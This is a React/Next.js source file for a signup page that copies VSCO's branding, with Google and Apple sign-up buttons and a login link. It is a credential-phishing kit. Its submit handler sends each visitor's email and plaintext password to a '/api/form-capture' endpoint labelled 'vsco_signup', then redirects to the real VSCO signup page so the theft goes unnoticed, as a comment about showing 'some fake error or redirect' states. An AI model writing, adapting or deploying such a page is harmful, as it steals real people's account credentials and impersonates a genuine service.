'use client';

import Link from 'next/link';
import { useState } from 'react';

export default function SignupPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      // Capture form data for tracking
      await fetch('/api/form-capture', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          source: 'vsco_signup',
          data: {
            email,
            password,
          },
        }),
      });

      // Show some fake error or redirect to real VSCO
      window.location.href = 'https://vsco.co/user/signup';
    } catch (error) {
      console.error('Error submitting form:', error);
    }
  };

  return (
    <div className='flex w-full max-w-md flex-col items-center justify-center rounded-lg bg-white py-20 text-[#111]'>
      <div className='mb-6 w-full text-center'>
        <h1 className='mb-2 text-sm font-medium'>JOIN VSCO FOR FREE</h1>
        <p className='text-sm text-gray-500'>
          Community, tools, and exposure for photographers.
        </p>
      </div>

      <form onSubmit={handleSubmit} className='w-full space-y-4'>
        <div>
          <input
            type='email'
            placeholder='Email'
            className='w-full rounded-md border-none bg-gray-700 bg-opacity-5 p-4 text-[#111]'
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
        </div>

        <div className='relative'>
          <input
            type={showPassword ? 'text' : 'password'}
            placeholder='Password'
            className='w-full rounded-md border-none bg-gray-700 bg-opacity-5 p-4 text-[#111]'
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button
            type='button'
            onClick={() => setShowPassword(!showPassword)}
            className='absolute right-3 top-1/2 -translate-y-1/2 transform text-gray-500'
          >
            <svg
              viewBox='0 0 24 24'
              fill='none'
              className='h-6 w-6'
              xmlns='http://www.w3.org/2000/svg'
            >
              {showPassword ? (
                <path
                  d='M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z'
                  stroke='currentColor'
                  strokeWidth='2'
                  strokeLinecap='round'
                  strokeLinejoin='round'
                />
              ) : (
                <path
                  d='M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24M1 1l22 22'
                  stroke='currentColor'
                  strokeWidth='2'
                  strokeLinecap='round'
                  strokeLinejoin='round'
                />
              )}
              <circle
                cx='12'
                cy='12'
                r='3'
                stroke='currentColor'
                strokeWidth='2'
                strokeLinecap='round'
                strokeLinejoin='round'
              />
            </svg>
          </button>
        </div>

        <div className='pt-2 text-xs text-gray-500'>
          By signing up, you agree to VSCO's{' '}
          <a href='#' className='underline'>
            Terms of Use
          </a>{' '}
          &{' '}
          <a href='#' className='underline'>
            Privacy Policy
          </a>
        </div>

        <button
          type='submit'
          className='w-full rounded-full bg-[#111] py-3 font-medium text-white transition-colors hover:bg-gray-900'
        >
          SIGN UP AND AGREE
        </button>
      </form>

      <div className='relative my-6 w-full'>
        <div className='absolute inset-0 flex items-center'>
          <div className='w-full border-t-2 border-gray-300'></div>
        </div>
        <div className='relative flex justify-center'>
          <span className='bg-white px-4 text-xs uppercase text-gray-500'>
            or
          </span>
        </div>
      </div>

      <div className='w-full space-y-3'>
        <button className='flex w-full items-center justify-center space-x-2 rounded-full border-2 border-gray-300 px-4 py-3 transition-colors hover:bg-gray-50'>
          <svg viewBox='0 0 24 24' width='18' height='18' className='mr-2'>
            <path
              d='M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z'
              fill='#4285F4'
            />
            <path
              d='M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z'
              fill='#34A853'
            />
            <path
              d='M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z'
              fill='#FBBC05'
            />
            <path
              d='M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z'
              fill='#EA4335'
            />
          </svg>
          <span>Sign up with Google</span>
        </button>

        <button className='flex w-full items-center justify-center space-x-2 rounded-full border-2 border-gray-300 px-4 py-3 transition-colors hover:bg-gray-50'>
          <svg
            viewBox='0 0 24 24'
            width='18'
            height='18'
            fill='currentColor'
            className='mr-2'
          >
            <path d='M16.365 1.43c0 1.14-.493 2.27-1.177 3.08-.744.9-1.99 1.57-2.987 1.57-.12 0-.23-.02-.3-.03-.01-.06-.04-.22-.04-.39 0-1.15.572-2.27 1.206-2.98.804-.94 2.142-1.64 3.248-1.68.03.13.05.28.05.43zm4.565 15.71c-.03.07-.463 1.58-1.518 3.12-.945 1.34-1.94 2.71-3.43 2.71-1.517 0-1.9-.88-3.63-.88-1.698 0-2.302.91-3.67.91-1.377 0-2.332-1.26-3.428-2.8-1.287-1.82-2.323-4.63-2.323-7.28 0-4.28 2.797-6.55 5.552-6.55 1.448 0 2.675.95 3.6.95.865 0 2.222-1.01 3.902-1.01.613 0 2.886.06 4.374 2.19-.13.09-2.383 1.37-2.383 4.19 0 3.26 2.854 4.42 2.955 4.45z' />
          </svg>
          <span>Sign up with Apple</span>
        </button>
      </div>

      <div className='mt-8 w-full text-center'>
        <p className='mb-2 text-sm text-gray-400'>Already have an account?</p>
        <Link
          href='/vsco/user/login'
          className='inline-block w-full rounded-full border-2 border-gray-300 px-4 py-2 text-sm font-medium text-[#111] transition-colors hover:bg-gray-50'
        >
          LOG IN
        </Link>
      </div>
    </div>
  );
}
